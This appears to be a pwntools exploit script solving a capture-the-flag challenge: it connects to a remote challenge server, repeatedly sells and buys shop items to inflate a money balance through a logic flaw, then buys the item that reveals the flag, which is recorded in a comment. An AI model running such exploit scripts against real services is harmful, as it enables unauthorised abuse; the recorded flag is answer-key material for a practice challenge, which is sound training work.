from pwn import *
#context(arch='amd64')
#context(log_level='debug')

sd = lambda s:p.send(s)
sl = lambda s:p.sendline(s)
rc = lambda s:p.recv(s)
ru = lambda s:p.recvuntil(s)
sda = lambda a,s:p.sendafter(a,s)
sla = lambda a,s:p.sendlineafter(a,s)

def sell(i):
    sla('> ','3')
    sla('> ',str(i))
def buy(i):
    sla('> ','2')
    sla('> ',str(i))
def look():
    sla('> ','1')
    ru('money: ')
    return int(ru('\n')[:-1])

#p = process('./pwn',env={'LD_PRELOAD':'./libc.so'},aslr=False)
p = remote('node4.buuoj.cn',29884)

#attach(p,'b *&write\nc')

while True:
    sell(0)
    sell(0)
    mon = look()
    print(mon)
    if mon > 199:
        break
    buy(2)
buy(1)
sla('> ','1')

p.interactive() # flag{e43d371f-6380-4395-952e-a302b62ee6ce}
